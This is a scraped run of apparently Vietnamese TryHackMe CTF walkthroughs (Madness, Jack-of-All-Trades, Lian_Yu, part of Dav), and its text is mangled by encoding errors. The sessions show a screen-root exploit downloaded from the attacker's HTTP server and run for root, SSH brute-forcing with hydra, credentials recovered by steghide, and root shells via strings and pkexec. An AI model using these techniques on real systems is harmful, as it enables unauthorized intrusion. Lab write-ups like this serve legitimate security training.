â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cd /usr/share/exploitdb/exploits/linux/local/ â”Œâ”€â”€(neoã‰¿kali)-[/usr/â€¦/exploitdb/exploits/linux/local] â””â”€$ python -m http.server 8000 Sau Ä‘Ã³ táº£i exploit lÃªn machine\njoker@ubuntu:~$ wget http://10.6.0.191:8000/41154.sh --2022-11-07 00:28:17-- http://10.6.0.191:8000/41154.sh Connecting to 10.6.0.191:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 1149 (1.1K) [text/x-sh] Saving to: â€˜41154.shâ€™ 41154.sh 100%[====================================================================================================\u0026gt;] 1.12K --.-KB/s in 0.01s 2022-11-07 00:28:18 (78.1 KB/s) - â€˜41154.shâ€™ saved [1149/1149] joker@ubuntu:~$ joker@ubuntu:~$ chmod +x 41154.sh joker@ubuntu:~$ ./41154.sh ~ gnu/screenroot ~ [+] First, we create our shell and library... [+] Now we create our /etc/ld.so.preload file... [+] Triggering... \u0026#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored. [+] done! No Sockets found in /tmp/screens/S-joker. # id uid=0(root) gid=0(root) groups=0(root),1000(joker) # ls /root root.txt # ","date":"25 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/madness/","section":"Ctf","summary":"","title":"Tryhackme - Madness","type":"ctf"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Jack-of-All-Trades\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE VERSION 22/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Jack-of-all-trades! |_http-server-header: Apache/2.4.10 (Debian) |_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 80/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 13b7f0a114e2d32540ff4b9460c5003d (DSA) | 2048 910cd643d940c388b1be350bbcb99088 (RSA) | 256 a3fb09fb5080718f931f8d43971edcab (ECDSA) |_ 256 6521e74e7c5ae7bcc6ff68caf1cb75e3 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Truy cáº­p web vá»›i port 22.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ curl -s http://10.10.212.34:22 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Jack-of-all-trades!\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;assets/style.css\u0026#34; rel=stylesheet type=text/css\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img id=\u0026#34;header\u0026#34; src=\u0026#34;assets/header.jpg\u0026#34; width=100%\u0026gt; \u0026lt;h1\u0026gt;Welcome to Jack-of-all-trades!\u0026lt;/h1\u0026gt; \u0026lt;main\u0026gt; \u0026lt;p\u0026gt;My name is Jack. I\u0026#39;m a toymaker by trade but I can do a little of anything -- hence the name!\u0026lt;br\u0026gt;I specialise in making children\u0026#39;s toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I\u0026#39;ll see if I can help you out.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that\u0026#39;s all behind me. I\u0026#39;m invested in other pursuits now!\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Please bear with me; I\u0026#39;m old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don\u0026#39;t worry, I \u0026lt;em\u0026gt;always\u0026lt;/em\u0026gt; clear up after myself.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;I love dinosaurs. I have a \u0026lt;em\u0026gt;huge\u0026lt;/em\u0026gt; collection of models. Like this one:\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;assets/stego.jpg\u0026#34;\u0026gt; \u0026lt;p\u0026gt;I make a lot of models myself, but I also do toys, like this one:\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;assets/jackinthebox.jpg\u0026#34;\u0026gt; \u0026lt;!--Note to self - If I ever get locked out I can get back in at /recovery.php! --\u0026gt; \u0026lt;!-- UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --\u0026gt; \u0026lt;p\u0026gt;I hope you choose to employ me. I love making new friends!\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Hope to see you soon!\u0026lt;/p\u0026gt; \u0026lt;p id=\u0026#34;signature\u0026#34;\u0026gt;Jack\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ TÃ´i cÃ³ 1 Ä‘oáº¡n code base64 á»Ÿ Ä‘Ã¢y. Giáº£i mÃ£ nÃ³ thÃ¬ tÃ´i Ä‘Æ°á»£c 1 lá»i nháº¯n\n*Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq\nTuy nhiÃªn tÃ´i Ä‘á»ƒ Ã½ cÃ²n cÃ³ má»™t path ná»¯a khÃ¡ thÃº vá»‹ lÃ  /recovery.php\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ curl -s http://10.10.212.34:22/recovery.php \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Recovery Page\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body{ text-align: center; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello Jack! Did you forget your machine password again?..\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/recovery.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Username:\u0026lt;/label\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input name=\u0026#34;user\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;label\u0026gt;Password:\u0026lt;/label\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input name=\u0026#34;pass\u0026#34; type=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Sá»­ dá»¥ng CyberChef\nThá»­ link trong pháº§n hint nÃ y thÃ¬ Ä‘Ã³ lÃ  wiki vá» Stegosauria - 1 loÃ i khá»§ng long. Khi Ä‘á»c Ä‘áº¿n Steg tÃ´i Ä‘Ã£ nghÄ© Ä‘áº¿n steghide, tÃ´i sáº½ táº£i táº¥t cáº£ cÃ¡c áº£nh cÃ³ trÃªn web vá» vÃ  thá»­ extract nÃ³ báº±ng steghide, cÃ²n passphrase thÃ¬ tÃ´i sáº½ thá»­ vá»›i Ä‘oáº¡n code vá»«a tÃ¬m Ä‘Æ°á»£c phÃ­a trÃªn.\nstego.jpg\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf stego.jpg Enter passphrase: wrote extracted data to \u0026#34;creds.txt\u0026#34;. â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat creds.txt Hehe. Gotcha! You\u0026#39;re on the right path, but wrong image! jackinthebox.jpg\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf jackinthebox.jpg Enter passphrase: steghide: could not extract any data with that passphrase! header.jpg\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf header.jpg Enter passphrase: wrote extracted data to \u0026#34;cms.creds\u0026#34;. â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat cms.creds Here you go Jack. Good thing you thought ahead! Username: jackinthebox Password: TplFxiSHjY â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Quay trá»Ÿ láº¡i path /recovery.php vÃ  login thá»­\nTheo nhÆ° lá»i nháº¯n, tÃ´i sáº½ thá»­ 1 cmd Ä‘Æ¡n giáº£n nhÆ° tháº¿ nÃ y\nKhi thá»­ cat /etc/passwd, tÃ´i Ä‘á»ƒ Ã½ tháº¥y url sáº½ bá»‹ mÃ£ hÃ³a rá»“i sau Ä‘Ã³ má»›i tráº£ vá» káº¿t quáº£, Ä‘iá»u nÃ y cÃ³ nghÄ©a lÃ  Ä‘á»ƒ command Ä‘Æ°á»£c thá»±c thi thÃ¬ tÃ´i pháº£i chuyá»ƒn nÃ³ vá» url encode\nTáº¡o listener vá»›i port 9001 vÃ  táº¡o shell vá»›i bash. Sau 1 lÃºc thá»­ cÃ¡c shell thÃ¬ khÃ´ng RCE Ä‘Æ°á»£c nÃªn tÃ´i quyáº¿t Ä‘á»‹nh sáº½ tÃ¬m thá»§ cÃ´ng.\nTrong thÆ° má»¥c /home cÃ³ 1 thÆ° má»¥c cá»§a user jack vÃ  1 file jacks_password_list. Khi má»Ÿ file nÃ y thÃ¬ nÃ³ lÃ  1 list cÃ¡c password, tÃ´i sáº½ lÆ°u nÃ³ vá» vÃ  thá»­ brute-force báº±ng hydra vá»›i user jack\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ hydra -l jack -P list.txt ssh://10.10.178.76:80 Hydra v9.3 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-06 09:12:51 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task [DATA] attacking ssh://10.10.178.76:80/ [80][ssh] host: 10.10.178.76 login: jack password: ITMJpGGIqg1jn?\u0026gt;@ 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-06 09:13:01 â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Login ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh jack@10.10.178.76 -p80 jack@10.10.178.76\u0026#39;s password: jack@jack-of-all-trades:~$ id uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth),1001(dev) jack@jack-of-all-trades:~$ ls user.jpg jack@jack-of-all-trades:~$ Táº£i file áº£nh nÃ y vá» vÃ  tÃ´i cÃ³ user flag\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ scp -P 80 jack@10.10.178.76:/home/jack/user.jpg /home/neo jack@10.10.178.76\u0026#39;s password: user.jpg 100% 286KB 17.1KB/s 00:16 â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ scp -P 80 jack@10.10.178.76:/home/jack/user.jpg /home/neo jack@10.10.178.76\u0026#39;s password: user.jpg 100% 286KB 17.1KB/s 00:16 Privilege escalation # sudo -l cáº§n cÃ³ pass cá»§a jack. TÃ´i sáº½ thá»­ find\njack@jack-of-all-trades:~$ find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/pt_chown /usr/bin/chsh /usr/bin/at /usr/bin/chfn /usr/bin/newgrp /usr/bin/strings /usr/bin/sudo /usr/bin/passwd /usr/bin/gpasswd /usr/bin/procmail /usr/sbin/exim4 /bin/mount /bin/umount /bin/su strings | GTFOBins\njack@jack-of-all-trades:~$ LFILE=/root/root.txt jack@jack-of-all-trades:~$ strings \u0026#34;$LFILE\u0026#34; ToDo: 1.Get new penguin skin rug -- surely they won\u0026#39;t miss one or two of those blasted creatures? 2.Make T-Rex model! 3.Meet up with Johny for a pint or two 4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her? 5.Remember to finish that contract for Lisa. 6.Delete this: securi-tay2020_{6f12*********************10a} ","date":"20 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/jack-of-all-trades/","section":"Ctf","summary":"","title":"Tryhackme - Jack-of-All-Trades","type":"ctf"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Lian_Yu\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 5650bd11efd4ac5632c3ee733ede87f4 (DSA) | 2048 396f3a9cb62dad0cd86dbe77130725d6 (RSA) | 256 a66996d76d6127967ebb9f83601b5212 (ECDSA) |_ 256 3f437675a85aa6cd33b066420491fea0 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Purgatory 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 43991/tcp status | 100024 1 50671/udp6 status | 100024 1 53634/udp status |_ 100024 1 58301/tcp6 status Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TÃ´i thá»­ qua ftp vá»›i user Anonymous nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£, váº­y nÃªn tÃ´i sáº½ báº¯t Ä‘áº§u vá»›i web - port 80\nSá»­ dá»¥ng dirsearch thÃ¬ tÃ´i tÃ¬m tháº¥y path áº©n lÃ  /island/\nVÃ o pháº§n source web thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c Code Word lÃ  vigilante, tÃ´i cÅ©ng chÆ°a biáº¿t code nÃ y Ä‘á»ƒ lÃ m gÃ¬ nhÆ°ng cá»© lÆ°u nÃ³ láº¡i Ä‘Ã£\nTiáº¿p dÃ¹ng dirsearch thÃªm 1 láº§n ná»¯a tÃ´i cÃ³ 1 path khÃ¡c lÃ  /2100\nTruy cáº­p vÃ o path nÃ y vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c 1 thá»© khÃ¡c trong pháº§n source web\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 align=center\u0026gt;How Oliver Queen finds his way to Lian_Yu?\u0026lt;/h1\u0026gt; \u0026lt;p align=center \u0026gt; \u0026lt;iframe width=\u0026#34;640\u0026#34; height=\u0026#34;480\u0026#34; src=\u0026#34;[https://www.youtube.com/embed/X8ZiFuW41yY](view-source:https://www.youtube.com/embed/X8ZiFuW41yY)\u0026#34;\u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;p\u0026gt; \u0026lt;!-- you can avail your .ticket here but how? --\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Váº­y lÃ  file áº©n cÃ³ Ä‘uÃ´i .ticket. TÃ´i sáº½ sá»­ dá»¥ng dirsearch thÃªm 1 láº§n ná»¯a vÃ  thÃªm extension lÃ  .ticket\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ dirsearch -u 10.10.171.203/island/2100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e ticket TÃ´i tÃ¬m Ä‘Æ°á»£c green_arrow\nVá»›i Hint sá»­ dá»¥ng CyberChef, tÃ´i tÃ¬m decode Ä‘Æ°á»£c mÃ£ trÃªn vá»›i base58.\nLogin nÃ³ vá»›i ftp vÃ  sá»­ dá»¥ng user vigilante\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ftp 10.10.171.203 Connected to 10.10.171.203. 220 (vsFTPd 3.0.2) Name (10.10.171.203:neo): vigilante 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||38540|). 150 Here comes the directory listing. -rw-r--r-- 1 0 0 511720 May 01 2020 Leave_me_alone. -rw-r--r-- 1 0 0 549924 May 05 2020 Queen\u0026#39;s_Gambit. -rw-r--r-- 1 0 0 191026 May 01 2020 aa.jpg 226 Directory send OK. ftp\u0026gt; Láº¥y cáº£ 3 áº£nh nÃ y vá» Ä‘á»ƒ phÃ¢n tÃ­ch. Trong nÃ y cÃ³ 2 áº£nh Quenn vÃ  aa lÃ  cÃ³ thá»ƒ xem Ä‘Æ°á»£c cÃ²n áº£nh Leave_me_alone thÃ¬ khÃ´ng. TÃ´i sáº½ up nÃ³ lÃªn *hexed.it Ä‘á»ƒ phÃ¢n tÃ­ch\n8 byte kÃ½ hiá»‡u Ä‘áº§u tiÃªn cá»§a file png nÃ y khÃ´ng Ä‘Ãºng (hoáº·c Ä‘Ã£ bá»‹ thay Ä‘á»•i). TÃ´i sáº½ sá»­a láº¡i nÃ³ vÃ  export ra áº£nh má»›i\náº¢nh nÃ y vÃ  aa Ä‘á»u cÃ³ Ä‘iá»ƒm chung lÃ  vá» nhá»¯ng tay sÃºng, nÃªn tÃ´i nghÄ© chÃºng cÃ³ thá»ƒ liÃªn quan Ä‘áº¿n nhau chÄƒng?\nTÃ´i sáº½ thá»­ dÃ¹ng steghide phÃ¢n tÃ­ch áº£nh aa vá»›i passphrase lÃ  password\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf aa.jpg Enter passphrase: wrote extracted data to \u0026#34;ss.zip\u0026#34;. ÄÆ°á»£c luÃ´n! Giáº£i náº¿n tá»‡p nÃ y\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ unzip ss.zip Archive: ss.zip inflating: passwd.txt inflating: shado â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat passwd.txt This is your visa to Land on Lian_Yu # Just for Fun *** a small Note about it Having spent years on the island, Oliver learned how to be resourceful and set booby traps all over the island in the common event he ran into dangerous people. The island is also home to many animals, including pheasants, wild pigs and wolves. â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat shado M3tahuman BÃ¢y giá» tÃ´i Ä‘Ã£ cÃ³ 1 password nhÆ°ng chÆ°a cÃ³ username, nhÃ¬n láº¡i chiáº¿c áº£nh vá» ngÆ°á»i Ä‘Ã n Ã´ng nÃ y, tÃ´i thá»­ tÃ¬m kiáº¿m trÃªn gg báº±ng bá»©c áº£nh nÃ y vÃ  ngÆ°á»i trong áº£nh tÃªn lÃ  Slade Wilson a.k.a Deathstroke\nThá»­ login ssh vá»›i tÃªn Slade\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh slade@10.10.59.181 The authenticity of host \u0026#39;10.10.59.181 (10.10.59.181)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:77: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.59.181\u0026#39; (ED25519) to the list of known hosts. slade@10.10.59.181\u0026#39;s password: Way To SSH... Loading.........Done.. Connecting To Lian_Yu Happy Hacking â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â•â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•”â•â•â•â• â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ•â•â•â•â•â•â•â•šâ•â•â•šâ•â• â•šâ•â•â•šâ•â• â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â• # slade@LianYu:~$ id uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth) slade@LianYu:~$ ls user.txt Privilege escalation # sudo -l\nslade@LianYu:~$ sudo -l [sudo] password for slade: Matching Defaults entries for slade on LianYu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User slade may run the following commands on LianYu: (root) PASSWD: /usr/bin/pkexec slade@LianYu:~$ pkexec | GTFOBins\nslade@LianYu:~$ sudo pkexec /bin/sh # id uid=0(root) gid=0(root) groups=0(root) # ls /root root.txt # ","date":"18 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/lian-yu/","section":"Ctf","summary":"","title":"Tryhackme - Lian_Yu","type":"ctf"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Dav\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Web nÃ y chá»‰ lÃ  trang máº·c Ä‘á»‹nh, pháº§n source cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t. TÃ´i sáº½ dÃ¹ng dirsearch Ä‘á»ƒ tÃ¬m path\n[05:39:10] 401 - 459B - /webdav/index.html [05:39:10] 401 - 459B - /webdav/ [05:39:10] 401 - 459B - /webdav/servlet/webdav/ Khi truy cáº­p vÃ o path nÃ y, tÃ´i cáº§n pháº£i cÃ³ user vÃ  pass. Sau 1 lÃºc tÃ¬m hiá»ƒu vá» webdav thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c cÃ¡ch kiá»ƒm tra vÃ  truy cáº­p webdav vá»›i user vÃ  pass máº·c Ä‘á»‹nh. NÃ³ á»Ÿ Ä‘Ã¢y.\nThá»­ login webdav vá»›i cadaver - tool cÃ³ sáºµn trÃªn kali\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cadaver http://10.10.115.69/webdav Authentication required for webdav on server `10.10.115.69\u0026#39;: Username: wampp Password: dav:/webdav/\u0026gt; ? Available commands: ls cd pwd put get mget mput edit less mkcol cat delete rmcol copy move lock unlock discover steal showlocks version checkin checkout uncheckout history label propnames chexec propget propdel propset search set open close echo quit unset lcd lls lpwd logout help describe about Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye dav:/webdav/\u0026gt; TÃ´i sáº½ thá»­ táº¡o 1 file txt vÃ  upload nÃ³ lÃªn webdav, Ä‘á»ƒ kiá»ƒm tra xem nÃ³ cÃ³ cháº¡y khÃ´ng.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ echo \u0026#34;TESTING\u0026#34; \u0026gt; test.txt dav:/webdav/\u0026gt; put test.txt Uploading test.txt to `/webdav/test.txt\u0026#39;: Progress: [=============================\u0026gt;] 100.0% of 8 bytes succeeded. dav:/webdav/\u0026gt; Truy cáº­p trÃªn web\nThÃ nh cÃ´ng. 